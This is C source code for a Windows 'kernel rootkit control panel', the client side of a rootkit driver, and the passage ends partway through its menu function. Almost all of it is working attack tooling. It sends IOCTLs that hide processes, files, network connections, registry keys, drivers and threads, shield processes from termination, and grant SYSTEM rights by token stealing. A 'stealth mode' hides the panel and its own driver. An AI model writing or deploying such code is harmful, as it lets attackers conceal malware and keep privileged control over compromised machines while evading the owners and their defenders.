#include <windows.h>
#include <stdio.h>
#include <string.h>

#define device_name "\\\\.\\krkdev"

#define ctl_code(dev, func, meth, acc) (((dev) << 16) | ((acc) << 14) | ((func) << 2) | (meth))
#define file_device_unknown 0x00000022
#define method_buffered 0
#define file_any_access 0

#define ctl_base 0x800
#define ctl_process (ctl_base + 0x10)
#define ctl_file (ctl_base + 0x20)
#define ctl_net (ctl_base + 0x30)
#define ctl_reg (ctl_base + 0x40)
#define ctl_driver (ctl_base + 0x50)
#define ctl_thread (ctl_base + 0x60)
#define ctl_callback (ctl_base + 0x70)
#define ctl_system (ctl_base + 0x80)

#define ioctl_add_hidden_process ctl_code(file_device_unknown, ctl_process + 0, method_buffered, file_any_access)
#define ioctl_remove_hidden_process ctl_code(file_device_unknown, ctl_process + 1, method_buffered, file_any_access)
#define ioctl_list_hidden_processes ctl_code(file_device_unknown, ctl_process + 2, method_buffered, file_any_access)
#define ioctl_add_protected_process ctl_code(file_device_unknown, ctl_process + 3, method_buffered, file_any_access)
#define ioctl_remove_protected_process ctl_code(file_device_unknown, ctl_process + 4, method_buffered, file_any_access)
#define ioctl_list_protected_processes ctl_code(file_device_unknown, ctl_process + 5, method_buffered, file_any_access)
#define ioctl_elevate_process ctl_code(file_device_unknown, ctl_process + 6, method_buffered, file_any_access)
#define ioctl_hide_process_by_name ctl_code(file_device_unknown, ctl_process + 7, method_buffered, file_any_access)

#define ioctl_add_hidden_file ctl_code(file_device_unknown, ctl_file + 0, method_buffered, file_any_access)
#define ioctl_remove_hidden_file ctl_code(file_device_unknown, ctl_file + 1, method_buffered, file_any_access)
#define ioctl_list_hidden_files ctl_code(file_device_unknown, ctl_file + 2, method_buffered, file_any_access)

#define ioctl_add_hidden_connection ctl_code(file_device_unknown, ctl_net + 0, method_buffered, file_any_access)
#define ioctl_remove_hidden_connection ctl_code(file_device_unknown, ctl_net + 1, method_buffered, file_any_access)
#define ioctl_list_hidden_connections ctl_code(file_device_unknown, ctl_net + 2, method_buffered, file_any_access)

#define ioctl_add_hidden_reg ctl_code(file_device_unknown, ctl_reg + 0, method_buffered, file_any_access)
#define ioctl_remove_hidden_reg ctl_code(file_device_unknown, ctl_reg + 1, method_buffered, file_any_access)
#define ioctl_list_hidden_reg ctl_code(file_device_unknown, ctl_reg + 2, method_buffered, file_any_access)

#define ioctl_add_hidden_driver ctl_code(file_device_unknown, ctl_driver + 0, method_buffered, file_any_access)
#define ioctl_remove_hidden_driver ctl_code(file_device_unknown, ctl_driver + 1, method_buffered, file_any_access)
#define ioctl_list_hidden_drivers ctl_code(file_device_unknown, ctl_driver + 2, method_buffered, file_any_access)

#define ioctl_add_hidden_thread ctl_code(file_device_unknown, ctl_thread + 0, method_buffered, file_any_access)
#define ioctl_remove_hidden_thread ctl_code(file_device_unknown, ctl_thread + 1, method_buffered, file_any_access)
#define ioctl_list_hidden_threads ctl_code(file_device_unknown, ctl_thread + 2, method_buffered, file_any_access)

#define ioctl_enable_reg_callback ctl_code(file_device_unknown, ctl_callback + 0, method_buffered, file_any_access)
#define ioctl_disable_reg_callback ctl_code(file_device_unknown, ctl_callback + 1, method_buffered, file_any_access)
#define ioctl_enable_proc_notify ctl_code(file_device_unknown, ctl_callback + 2, method_buffered, file_any_access)
#define ioctl_disable_proc_notify ctl_code(file_device_unknown, ctl_callback + 3, method_buffered, file_any_access)
#define ioctl_enable_image_notify ctl_code(file_device_unknown, ctl_callback + 4, method_buffered, file_any_access)
#define ioctl_disable_image_notify ctl_code(file_device_unknown, ctl_callback + 5, method_buffered, file_any_access)
#define ioctl_get_proc_log ctl_code(file_device_unknown, ctl_callback + 6, method_buffered, file_any_access)
#define ioctl_get_image_log ctl_code(file_device_unknown, ctl_callback + 7, method_buffered, file_any_access)
#define ioctl_clear_proc_log ctl_code(file_device_unknown, ctl_callback + 8, method_buffered, file_any_access)
#define ioctl_clear_image_log ctl_code(file_device_unknown, ctl_callback + 9, method_buffered, file_any_access)

#define ioctl_get_status ctl_code(file_device_unknown, ctl_system + 0, method_buffered, file_any_access)
#define ioctl_ping ctl_code(file_device_unknown, ctl_system + 1, method_buffered, file_any_access)
#define ioctl_flush_all ctl_code(file_device_unknown, ctl_system + 2, method_buffered, file_any_access)

#define max_name_len 260
#define max_path_len 512
#define max_log_entries 64
#define proto_tcp 0
#define proto_udp 1

typedef struct _process_request {
    DWORD pid;
    WCHAR name[max_name_len];
} process_request;

typedef struct _file_request {
    WCHAR path[max_path_len];
} file_request;

typedef struct _net_request {
    DWORD local_port;
    DWORD remote_port;
    DWORD local_addr;
    DWORD remote_addr;
    DWORD pid;
    DWORD protocol;
} net_request;

typedef struct _reg_request {
    WCHAR path[max_path_len];
} reg_request;

typedef struct _driver_request {
    WCHAR name[max_name_len];
} driver_request;

typedef struct _thread_request {
    DWORD tid;
    DWORD owner_pid;
} thread_request;

typedef struct _proc_log_entry {
    DWORD pid;
    DWORD parent_pid;
    DWORD created;
    WCHAR name[max_name_len];
} proc_log_entry;

typedef struct _image_log_entry {
    DWORD pid;
    DWORD system_wide;
    WCHAR name[max_path_len];
} image_log_entry;

typedef struct _status_response {
    DWORD process_hide_active;
    DWORD file_hide_active;
    DWORD net_hide_active;
    DWORD reg_hide_active;
    DWORD driver_hide_active;
    DWORD thread_hide_active;
    DWORD protection_active;
    DWORD reg_callback_active;
    DWORD proc_notify_active;
    DWORD image_notify_active;
    DWORD hidden_process_count;
    DWORD hidden_file_count;
    DWORD hidden_net_count;
    DWORD hidden_reg_count;
    DWORD hidden_driver_count;
    DWORD hidden_thread_count;
    DWORD protected_process_count;
    DWORD proc_log_count;
    DWORD image_log_count;
} status_response;

static HANDLE g_handle = INVALID_HANDLE_VALUE;

static int open_driver(void)
{
    if (g_handle != INVALID_HANDLE_VALUE) return 1;
    g_handle = CreateFileA(device_name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    return g_handle != INVALID_HANDLE_VALUE;
}

static void close_driver(void)
{
    if (g_handle != INVALID_HANDLE_VALUE) {
        CloseHandle(g_handle);
        g_handle = INVALID_HANDLE_VALUE;
    }
}

static int send_ioctl(DWORD code, PVOID in_buf, DWORD in_size, PVOID out_buf, DWORD out_size, PDWORD bytes_out)
{
    DWORD br = 0;
    if (!open_driver()) return 0;
    if (DeviceIoControl(g_handle, code, in_buf, in_size, out_buf, out_size, &br, NULL)) {
        if (bytes_out) *bytes_out = br;
        return 1;
    }
    return 0;
}

static void read_string(char *buf, int max_len)
{
    int c;
    while ((c = getchar()) != '\n' && c != EOF);
    if (fgets(buf, max_len, stdin)) {
        int len = (int)strlen(buf);
        if (len > 0 && buf[len - 1] == '\n') buf[len - 1] = 0;
    }
}

static void to_wide(const char *src, WCHAR *dst, int max_wchars)
{
    MultiByteToWideChar(CP_ACP, 0, src, -1, dst, max_wchars);
}

static void cmd_add_hidden_process(void)
{
    process_request pr;
    memset(&pr, 0, sizeof(pr));
    printf("pid: ");
    scanf("%lu", &pr.pid);
    send_ioctl(ioctl_add_hidden_process, &pr, sizeof(pr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
}

static void cmd_remove_hidden_process(void)
{
    process_request pr;
    memset(&pr, 0, sizeof(pr));
    printf("pid: ");
    scanf("%lu", &pr.pid);
    send_ioctl(ioctl_remove_hidden_process, &pr, sizeof(pr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
}

static void cmd_list_hidden_processes(void)
{
    process_request list[64];
    DWORD cnt = 0, i;
    if (send_ioctl(ioctl_list_hidden_processes, NULL, 0, list, sizeof(list), &cnt)) {
        cnt /= sizeof(process_request);
        for (i = 0; i < cnt; i++) printf("  pid %lu: %ws\n", list[i].pid, list[i].name);
        if (!cnt) printf("  (none)\n");
    } else printf("failed\n");
}

static void cmd_add_protected_process(void)
{
    process_request pr;
    memset(&pr, 0, sizeof(pr));
    printf("pid: ");
    scanf("%lu", &pr.pid);
    send_ioctl(ioctl_add_protected_process, &pr, sizeof(pr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
}

static void cmd_remove_protected_process(void)
{
    process_request pr;
    memset(&pr, 0, sizeof(pr));
    printf("pid: ");
    scanf("%lu", &pr.pid);
    send_ioctl(ioctl_remove_protected_process, &pr, sizeof(pr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
}

static void cmd_list_protected_processes(void)
{
    process_request list[64];
    DWORD cnt = 0, i;
    if (send_ioctl(ioctl_list_protected_processes, NULL, 0, list, sizeof(list), &cnt)) {
        cnt /= sizeof(process_request);
        for (i = 0; i < cnt; i++) printf("  pid %lu: %ws\n", list[i].pid, list[i].name);
        if (!cnt) printf("  (none)\n");
    } else printf("failed\n");
}

static void cmd_elevate_process(void)
{
    process_request pr;
    memset(&pr, 0, sizeof(pr));
    printf("pid to elevate: ");
    scanf("%lu", &pr.pid);
    send_ioctl(ioctl_elevate_process, &pr, sizeof(pr), NULL, 0, NULL) ? printf("elevated\n") : printf("failed\n");
}

static void cmd_hide_process_by_name(void)
{
    process_request pr;
    char namebuf[260];
    memset(&pr, 0, sizeof(pr));
    printf("image name: ");
    if (scanf(" %259s", namebuf) == 1) {
        to_wide(namebuf, pr.name, max_name_len);
        send_ioctl(ioctl_hide_process_by_name, &pr, sizeof(pr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
    }
}

static void cmd_add_hidden_file(void)
{
    file_request fr;
    char pathbuf[512];
    memset(&fr, 0, sizeof(fr));
    printf("path: ");
    if (scanf(" %511s", pathbuf) == 1) {
        to_wide(pathbuf, fr.path, max_path_len);
        send_ioctl(ioctl_add_hidden_file, &fr, sizeof(fr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
    }
}

static void cmd_remove_hidden_file(void)
{
    file_request fr;
    char pathbuf[512];
    memset(&fr, 0, sizeof(fr));
    printf("path: ");
    if (scanf(" %511s", pathbuf) == 1) {
        to_wide(pathbuf, fr.path, max_path_len);
        send_ioctl(ioctl_remove_hidden_file, &fr, sizeof(fr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
    }
}

static void cmd_list_hidden_files(void)
{
    file_request list[64];
    DWORD cnt = 0, i;
    if (send_ioctl(ioctl_list_hidden_files, NULL, 0, list, sizeof(list), &cnt)) {
        cnt /= sizeof(file_request);
        for (i = 0; i < cnt; i++) printf("  %ws\n", list[i].path);
        if (!cnt) printf("  (none)\n");
    } else printf("failed\n");
}

static void cmd_add_hidden_connection(void)
{
    net_request nr;
    memset(&nr, 0, sizeof(nr));
    printf("local_port: ");
    scanf("%lu", &nr.local_port);
    printf("remote_port: ");
    scanf("%lu", &nr.remote_port);
    printf("local_addr (decimal): ");
    scanf("%lu", &nr.local_addr);
    printf("remote_addr (decimal): ");
    scanf("%lu", &nr.remote_addr);
    printf("pid: ");
    scanf("%lu", &nr.pid);
    printf("protocol (0=tcp 1=udp): ");
    scanf("%lu", &nr.protocol);
    send_ioctl(ioctl_add_hidden_connection, &nr, sizeof(nr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
}

static void cmd_remove_hidden_connection(void)
{
    net_request nr;
    memset(&nr, 0, sizeof(nr));
    printf("local_port: ");
    scanf("%lu", &nr.local_port);
    printf("remote_port: ");
    scanf("%lu", &nr.remote_port);
    printf("local_addr: ");
    scanf("%lu", &nr.local_addr);
    printf("remote_addr: ");
    scanf("%lu", &nr.remote_addr);
    printf("pid: ");
    scanf("%lu", &nr.pid);
    printf("protocol (0=tcp 1=udp): ");
    scanf("%lu", &nr.protocol);
    send_ioctl(ioctl_remove_hidden_connection, &nr, sizeof(nr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
}

static void cmd_list_hidden_connections(void)
{
    net_request list[64];
    DWORD cnt = 0, i;
    if (send_ioctl(ioctl_list_hidden_connections, NULL, 0, list, sizeof(list), &cnt)) {
        cnt /= sizeof(net_request);
        for (i = 0; i < cnt; i++)
            printf("  %s lport=%lu rport=%lu pid=%lu\n",
                list[i].protocol == proto_udp ? "udp" : "tcp",
                list[i].local_port, list[i].remote_port, list[i].pid);
        if (!cnt) printf("  (none)\n");
    } else printf("failed\n");
}

static void cmd_add_hidden_reg(void)
{
    reg_request rr;
    char pathbuf[512];
    memset(&rr, 0, sizeof(rr));
    printf("reg path: ");
    if (scanf(" %511s", pathbuf) == 1) {
        to_wide(pathbuf, rr.path, max_path_len);
        send_ioctl(ioctl_add_hidden_reg, &rr, sizeof(rr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
    }
}

static void cmd_remove_hidden_reg(void)
{
    reg_request rr;
    char pathbuf[512];
    memset(&rr, 0, sizeof(rr));
    printf("reg path: ");
    if (scanf(" %511s", pathbuf) == 1) {
        to_wide(pathbuf, rr.path, max_path_len);
        send_ioctl(ioctl_remove_hidden_reg, &rr, sizeof(rr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
    }
}

static void cmd_list_hidden_reg(void)
{
    reg_request list[64];
    DWORD cnt = 0, i;
    if (send_ioctl(ioctl_list_hidden_reg, NULL, 0, list, sizeof(list), &cnt)) {
        cnt /= sizeof(reg_request);
        for (i = 0; i < cnt; i++) printf("  %ws\n", list[i].path);
        if (!cnt) printf("  (none)\n");
    } else printf("failed\n");
}

static void cmd_add_hidden_driver(void)
{
    driver_request dr;
    char namebuf[260];
    memset(&dr, 0, sizeof(dr));
    printf("driver name: ");
    if (scanf(" %259s", namebuf) == 1) {
        to_wide(namebuf, dr.name, max_name_len);
        send_ioctl(ioctl_add_hidden_driver, &dr, sizeof(dr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
    }
}

static void cmd_remove_hidden_driver(void)
{
    driver_request dr;
    char namebuf[260];
    memset(&dr, 0, sizeof(dr));
    printf("driver name: ");
    if (scanf(" %259s", namebuf) == 1) {
        to_wide(namebuf, dr.name, max_name_len);
        send_ioctl(ioctl_remove_hidden_driver, &dr, sizeof(dr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
    }
}

static void cmd_list_hidden_drivers(void)
{
    driver_request list[64];
    DWORD cnt = 0, i;
    if (send_ioctl(ioctl_list_hidden_drivers, NULL, 0, list, sizeof(list), &cnt)) {
        cnt /= sizeof(driver_request);
        for (i = 0; i < cnt; i++) printf("  %ws\n", list[i].name);
        if (!cnt) printf("  (none)\n");
    } else printf("failed\n");
}

static void cmd_add_hidden_thread(void)
{
    thread_request tr;
    memset(&tr, 0, sizeof(tr));
    printf("tid: ");
    scanf("%lu", &tr.tid);
    printf("owner pid: ");
    scanf("%lu", &tr.owner_pid);
    send_ioctl(ioctl_add_hidden_thread, &tr, sizeof(tr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
}

static void cmd_remove_hidden_thread(void)
{
    thread_request tr;
    memset(&tr, 0, sizeof(tr));
    printf("tid: ");
    scanf("%lu", &tr.tid);
    send_ioctl(ioctl_remove_hidden_thread, &tr, sizeof(tr), NULL, 0, NULL) ? printf("ok\n") : printf("failed\n");
}

static void cmd_list_hidden_threads(void)
{
    thread_request list[64];
    DWORD cnt = 0, i;
    if (send_ioctl(ioctl_list_hidden_threads, NULL, 0, list, sizeof(list), &cnt)) {
        cnt /= sizeof(thread_request);
        for (i = 0; i < cnt; i++) printf("  tid %lu (owner pid %lu)\n", list[i].tid, list[i].owner_pid);
        if (!cnt) printf("  (none)\n");
    } else printf("failed\n");
}

static void cmd_enable_reg_callback(void)
{
    send_ioctl(ioctl_enable_reg_callback, NULL, 0, NULL, 0, NULL) ? printf("registry callback enabled\n") : printf("failed\n");
}

static void cmd_disable_reg_callback(void)
{
    send_ioctl(ioctl_disable_reg_callback, NULL, 0, NULL, 0, NULL) ? printf("registry callback disabled\n") : printf("failed\n");
}

static void cmd_enable_proc_notify(void)
{
    send_ioctl(ioctl_enable_proc_notify, NULL, 0, NULL, 0, NULL) ? printf("process notify enabled\n") : printf("failed\n");
}

static void cmd_disable_proc_notify(void)
{
    send_ioctl(ioctl_disable_proc_notify, NULL, 0, NULL, 0, NULL) ? printf("process notify disabled\n") : printf("failed\n");
}

static void cmd_enable_image_notify(void)
{
    send_ioctl(ioctl_enable_image_notify, NULL, 0, NULL, 0, NULL) ? printf("image notify enabled\n") : printf("failed\n");
}

static void cmd_disable_image_notify(void)
{
    send_ioctl(ioctl_disable_image_notify, NULL, 0, NULL, 0, NULL) ? printf("image notify disabled\n") : printf("failed\n");
}

static void cmd_get_proc_log(void)
{
    proc_log_entry log[max_log_entries];
    DWORD cnt = 0, i;
    if (send_ioctl(ioctl_get_proc_log, NULL, 0, log, sizeof(log), &cnt)) {
        cnt /= sizeof(proc_log_entry);
        for (i = 0; i < cnt; i++)
            printf("  [%s] pid=%lu parent=%lu %ws\n",
                log[i].created ? "start" : "exit",
                log[i].pid, log[i].parent_pid, log[i].name);
        if (!cnt) printf("  (empty)\n");
    } else printf("failed\n");
}

static void cmd_get_image_log(void)
{
    image_log_entry log[max_log_entries];
    DWORD cnt = 0, i;
    if (send_ioctl(ioctl_get_image_log, NULL, 0, log, sizeof(log), &cnt)) {
        cnt /= sizeof(image_log_entry);
        for (i = 0; i < cnt; i++)
            printf("  [%s] pid=%lu %ws\n",
                log[i].system_wide ? "kernel" : "user",
                log[i].pid, log[i].name);
        if (!cnt) printf("  (empty)\n");
    } else printf("failed\n");
}

static void cmd_clear_proc_log(void)
{
    send_ioctl(ioctl_clear_proc_log, NULL, 0, NULL, 0, NULL) ? printf("cleared\n") : printf("failed\n");
}

static void cmd_clear_image_log(void)
{
    send_ioctl(ioctl_clear_image_log, NULL, 0, NULL, 0, NULL) ? printf("cleared\n") : printf("failed\n");
}

static void cmd_get_status(void)
{
    status_response sr;
    if (send_ioctl(ioctl_get_status, NULL, 0, &sr, sizeof(sr), NULL)) {
        printf("\n  --- counts ---\n");
        printf("  hidden processes:    %lu\n", sr.hidden_process_count);
        printf("  protected processes: %lu\n", sr.protected_process_count);
        printf("  hidden files:        %lu\n", sr.hidden_file_count);
        printf("  hidden connections:  %lu\n", sr.hidden_net_count);
        printf("  hidden reg keys:     %lu\n", sr.hidden_reg_count);
        printf("  hidden drivers:      %lu\n", sr.hidden_driver_count);
        printf("  hidden threads:      %lu\n", sr.hidden_thread_count);
        printf("  proc log entries:    %lu\n", sr.proc_log_count);
        printf("  image log entries:   %lu\n", sr.image_log_count);
        printf("  --- callbacks ---\n");
        printf("  registry callback:   %s\n", sr.reg_callback_active ? "on" : "off");
        printf("  process notify:      %s\n", sr.proc_notify_active ? "on" : "off");
        printf("  image notify:        %s\n", sr.image_notify_active ? "on" : "off");
    } else printf("failed\n");
}

static void cmd_flush_all(void)
{
    send_ioctl(ioctl_flush_all, NULL, 0, NULL, 0, NULL) ? printf("all lists flushed\n") : printf("failed\n");
}

static void cmd_self_protect(void)
{
    process_request pr;
    memset(&pr, 0, sizeof(pr));
    pr.pid = GetCurrentProcessId();
    if (send_ioctl(ioctl_add_protected_process, &pr, sizeof(pr), NULL, 0, NULL))
        printf("control panel (pid %lu) is now protected\n", pr.pid);
    else
        printf("failed to protect control panel\n");
}

static void cmd_self_hide(void)
{
    process_request pr;
    memset(&pr, 0, sizeof(pr));
    pr.pid = GetCurrentProcessId();
    if (send_ioctl(ioctl_add_hidden_process, &pr, sizeof(pr), NULL, 0, NULL))
        printf("control panel (pid %lu) is now hidden\n", pr.pid);
    else
        printf("failed to hide control panel\n");
}

static void cmd_quick_hide(void)
{
    process_request pr;
    file_request fr;
    char pathbuf[512];
    int ok = 1;

    memset(&pr, 0, sizeof(pr));
    printf("pid to hide: ");
    scanf("%lu", &pr.pid);
    if (!send_ioctl(ioctl_add_hidden_process, &pr, sizeof(pr), NULL, 0, NULL)) {
        printf("failed to hide process\n");
        ok = 0;
    }
    if (!send_ioctl(ioctl_add_protected_process, &pr, sizeof(pr), NULL, 0, NULL)) {
        printf("failed to protect process\n");
        ok = 0;
    }
    printf("hide executable path? (y/n): ");
    {
        char yn[4] = {0};
        scanf(" %1s", yn);
        if (yn[0] == 'y' || yn[0] == 'Y') {
            memset(&fr, 0, sizeof(fr));
            printf("path: ");
            if (scanf(" %511s", pathbuf) == 1) {
                to_wide(pathbuf, fr.path, max_path_len);
                if (!send_ioctl(ioctl_add_hidden_file, &fr, sizeof(fr), NULL, 0, NULL)) {
                    printf("failed to hide file\n");
                    ok = 0;
                }
            }
        }
    }
    printf(ok ? "quick hide complete\n" : "quick hide partial\n");
}

static void cmd_enable_all_callbacks(void)
{
    int ok = 1;
    if (!send_ioctl(ioctl_enable_reg_callback, NULL, 0, NULL, 0, NULL)) {
        printf("registry callback: failed\n");
        ok = 0;
    } else {
        printf("registry callback: enabled\n");
    }
    if (!send_ioctl(ioctl_enable_proc_notify, NULL, 0, NULL, 0, NULL)) {
        printf("process notify: failed\n");
        ok = 0;
    } else {
        printf("process notify: enabled\n");
    }
    if (!send_ioctl(ioctl_enable_image_notify, NULL, 0, NULL, 0, NULL)) {
        printf("image notify: failed\n");
        ok = 0;
    } else {
        printf("image notify: enabled\n");
    }
    printf(ok ? "all callbacks enabled\n" : "some callbacks failed\n");
}

static void cmd_disable_all_callbacks(void)
{
    send_ioctl(ioctl_disable_reg_callback, NULL, 0, NULL, 0, NULL);
    send_ioctl(ioctl_disable_proc_notify, NULL, 0, NULL, 0, NULL);
    send_ioctl(ioctl_disable_image_notify, NULL, 0, NULL, 0, NULL);
    printf("all callbacks disabled\n");
}

static void cmd_monitor_procs(void)
{
    int count = 0;
    printf("monitoring process events (press ctrl+c to stop)...\n");
    while (count < 200) {
        proc_log_entry log[max_log_entries];
        DWORD cnt = 0, i;
        if (send_ioctl(ioctl_get_proc_log, NULL, 0, log, sizeof(log), &cnt)) {
            cnt /= sizeof(proc_log_entry);
            for (i = 0; i < cnt; i++) {
                printf("[%s] pid=%lu parent=%lu %ws\n",
                    log[i].created ? "start" : "exit",
                    log[i].pid, log[i].parent_pid, log[i].name);
                count++;
            }
            if (cnt > 0) send_ioctl(ioctl_clear_proc_log, NULL, 0, NULL, 0, NULL);
        }
        Sleep(500);
    }
    printf("monitor stopped after %d events\n", count);
}

static void cmd_monitor_images(void)
{
    int count = 0;
    printf("monitoring image loads (press ctrl+c to stop)...\n");
    while (count < 200) {
        image_log_entry log[max_log_entries];
        DWORD cnt = 0, i;
        if (send_ioctl(ioctl_get_image_log, NULL, 0, log, sizeof(log), &cnt)) {
            cnt /= sizeof(image_log_entry);
            for (i = 0; i < cnt; i++) {
                printf("[%s] pid=%lu %ws\n",
                    log[i].system_wide ? "kernel" : "user",
                    log[i].pid, log[i].name);
                count++;
            }
            if (cnt > 0) send_ioctl(ioctl_clear_image_log, NULL, 0, NULL, 0, NULL);
        }
        Sleep(500);
    }
    printf("monitor stopped after %d events\n", count);
}

static void cmd_list_all(void)
{
    printf("\n=== hidden processes ===\n");
    cmd_list_hidden_processes();
    printf("\n=== protected processes ===\n");
    cmd_list_protected_processes();
    printf("\n=== hidden files ===\n");
    cmd_list_hidden_files();
    printf("\n=== hidden connections ===\n");
    cmd_list_hidden_connections();
    printf("\n=== hidden registry keys ===\n");
    cmd_list_hidden_reg();
    printf("\n=== hidden drivers ===\n");
    cmd_list_hidden_drivers();
    printf("\n=== hidden threads ===\n");
    cmd_list_hidden_threads();
}

static void cmd_hide_port(void)
{
    net_request nr;
    DWORD port, proto;
    memset(&nr, 0, sizeof(nr));
    printf("port to hide: ");
    scanf("%lu", &port);
    printf("protocol (0=tcp 1=udp): ");
    scanf("%lu", &proto);
    nr.local_port = port;
    nr.protocol = proto;
    if (send_ioctl(ioctl_add_hidden_connection, &nr, sizeof(nr), NULL, 0, NULL))
        printf("port %lu (%s) hidden\n", port, proto == proto_udp ? "udp" : "tcp");
    else
        printf("failed\n");
}

static void cmd_hide_pid_full(void)
{
    process_request pr;
    DWORD pid;
    memset(&pr, 0, sizeof(pr));
    printf("pid: ");
    scanf("%lu", &pid);
    pr.pid = pid;
    printf("hiding pid %lu...\n", pid);
    if (send_ioctl(ioctl_add_hidden_process, &pr, sizeof(pr), NULL, 0, NULL))
        printf("  hidden: ok\n");
    else
        printf("  hidden: failed\n");
    if (send_ioctl(ioctl_add_protected_process, &pr, sizeof(pr), NULL, 0, NULL))
        printf("  protected: ok\n");
    else
        printf("  protected: failed\n");
    if (send_ioctl(ioctl_elevate_process, &pr, sizeof(pr), NULL, 0, NULL))
        printf("  elevated: ok\n");
    else
        printf("  elevated: failed\n");
}

static void cmd_stealth_mode(void)
{
    process_request pr;
    driver_request dr;
    char drvname[260];

    memset(&pr, 0, sizeof(pr));
    pr.pid = GetCurrentProcessId();
    printf("entering stealth mode...\n");
    send_ioctl(ioctl_add_hidden_process, &pr, sizeof(pr), NULL, 0, NULL);
    printf("  control panel hidden\n");
    send_ioctl(ioctl_add_protected_process, &pr, sizeof(pr), NULL, 0, NULL);
    printf("  control panel protected\n");
    memset(&dr, 0, sizeof(dr));
    to_wide("kernel-rootkit", dr.name, max_name_len);
    send_ioctl(ioctl_add_hidden_driver, &dr, sizeof(dr), NULL, 0, NULL);
    printf("  driver hidden\n");
    send_ioctl(ioctl_enable_reg_callback, NULL, 0, NULL, 0, NULL);
    printf("  registry callback active\n");
    send_ioctl(ioctl_enable_proc_notify, NULL, 0, NULL, 0, NULL);
    printf("  process notify active\n");
    send_ioctl(ioctl_enable_image_notify, NULL, 0, NULL, 0, NULL);
    printf("  image notify active\n");
    printf("stealth mode active\n");
}

static void cmd_help(void)
{
    printf("\ncommand reference:\n\n");
    printf("process hiding:\n");
    printf("  1  - add a process id to the hidden list\n");
    printf("  2  - remove a process id from the hidden list\n");
    printf("  3  - show all currently hidden process ids\n");
    printf("  4  - hide a process by its image name (e.g. notepad.exe)\n");
    printf("\nprocess protection:\n");
    printf("  5  - add a process to the protected list (blocks termination)\n");
    printf("  6  - remove a process from the protected list\n");
    printf("  7  - show all currently protected processes\n");
    printf("  8  - elevate a process by copying the system token\n");
    printf("\nfile hiding:\n");
    printf("  9  - add a file path to the hidden list\n");
    printf("  10 - remove a file path from the hidden list\n");
    printf("  11 - show all currently hidden file paths\n");
    printf("\nnetwork hiding:\n");
    printf("  12 - add a network connection to the hidden list\n");
    printf("       requires: local_port, remote_port, addrs, pid, protocol\n");
    printf("  13 - remove a network connection from the hidden list\n");
    printf("  14 - show all currently hidden connections\n");
    printf("\nregistry hiding:\n");
    printf("  15 - add a registry path to the hidden list\n");
    printf("       when reg callback is active, access to this key is blocked\n");
    printf("  16 - remove a registry path from the hidden list\n");
    printf("  17 - show all currently hidden registry paths\n");
    printf("\ndriver hiding:\n");
    printf("  18 - add a driver name to the hidden list\n");
    printf("  19 - remove a driver name from the hidden list\n");
    printf("  20 - show all currently hidden driver names\n");
    printf("\nthread hiding:\n");
    printf("  21 - add a thread id to the hidden list\n");
    printf("  22 - remove a thread id from the hidden list\n");
    printf("  23 - show all currently hidden threads\n");
    printf("\ncallbacks:\n");
    printf("  24 - enable registry callback (blocks access to hidden keys)\n");
    printf("  25 - disable registry callback\n");
    printf("  26 - enable process creation/exit notifications\n");
    printf("  27 - disable process notifications\n");
    printf("  28 - enable image load notifications (dll/driver loads)\n");
    printf("  29 - disable image load notifications\n");
    printf("\nlogs:\n");
    printf("  30 - view process creation/exit log\n");
    printf("  31 - view image load log\n");
    printf("  32 - clear process log\n");
    printf("  33 - clear image load log\n");
    printf("\nsystem:\n");
    printf("  34 - show full status of all modules\n");
    printf("  35 - flush all hidden lists (reset everything)\n");
    printf("\ncombo commands:\n");
    printf("  36 - quick hide (hide + protect + optional file hide)\n");
    printf("  37 - self protect (protect this control panel)\n");
    printf("  38 - self hide (hide this control panel)\n");
    printf("  39 - enable all callbacks at once\n");
    printf("  40 - disable all callbacks at once\n");
    printf("  41 - monitor process events (live)\n");
    printf("  42 - monitor image loads (live)\n");
    printf("  43 - list everything (all hidden items)\n");
    printf("  44 - help (this screen)\n");
    printf("  45 - hide port (quick connection hide by port)\n");
    printf("  46 - full pid hide (hide + protect + elevate)\n");
    printf("  47 - stealth mode (hide self + driver + enable all)\n");
    printf("  0  - exit\n");
}

static void print_version(void)
{
    OSVERSIONINFOA ovi;
    memset(&ovi, 0, sizeof(ovi));
    ovi.dwOSVersionInfoSize = sizeof(ovi);
    printf("  build:    1.0.0\n");
    printf("  pid:      %lu\n", GetCurrentProcessId());
    printf("  arch:     x64\n");
    printf("  device:   %s\n", device_name);
}

static void print_banner(void)
{
    printf("========================================\n");
    printf("       kernel rootkit control panel     \n");
    printf("========================================\n");
    print_version();
    printf("========================================\n");
}

static void print_menu(void)
{
    printf("\n");
    printf("--- process hiding ---\n");
    printf("  [1]  add hidden process (pid)\n");
    printf("  [2]  remove hidden process (pid)\n");
    printf("  [3]  list hidden processes\n");
    printf("  [4]  hide process by name\n");
    printf("--- process protection ---\n");
    printf("  [5]  add protected process (pid)\n");
    printf("  [6]  remove protected process (pid)\n");
    printf("  [7]  list protected processes\n");
    printf("  [8]  elevate process (token steal)\n");
    printf("--- file hiding ---\n");
    printf("  [9]  add hidden file\n");
    printf("  [10] remove hidden file\n");
    printf("  [11] list hidden files\n");
    printf("--- network hiding ---\n");
    printf("  [12] add hidden connection\n");
    printf("  [13] remove hidden connection\n");
    printf("  [14] list hidden connections\n");
    printf("--- registry hiding ---\n");
    printf("  [15] add hidden registry key\n");
    printf("  [16] remove hidden registry key\n");
    printf("  [17] list hidden registry keys\n");
    printf("--- driver hiding ---\n");
    printf("  [18] add hidden driver\n");
    printf("  [19] remove hidden driver\n");
    printf("  [20] list hidden drivers\n");
    printf("--- thread hiding ---\n");
    printf("  [21] add hidden thread\n");
    printf("  [22] remove hidden thread\n");
    printf("  [23] list hidden threads\n");
    printf("--- callbacks ---\n");
    printf("  [24] enable registry callback\n");
